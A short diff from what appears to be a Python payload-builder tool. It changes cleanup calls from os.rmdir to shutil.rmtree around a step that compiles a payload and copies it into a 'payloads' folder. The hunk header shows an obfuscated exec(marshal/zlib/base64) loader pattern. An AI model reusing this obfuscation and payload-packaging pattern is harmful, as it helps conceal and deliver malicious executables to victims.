@@ -330,11 +330,11 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
                 )  # Print output for debugging
                 shutil.copy(f"{payload_file_name}/dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
-            os.rmdir(f"{payload_file_name}")
+            shutil.rmtree(f"{payload_file_name}")
         
         except Exception as e:
             print(e)
-            os.rmdir(f"{payload_file_name}")
+            shutil.rmtree(f"{payload_file_name}")
 
 
     # File uploads is working again full
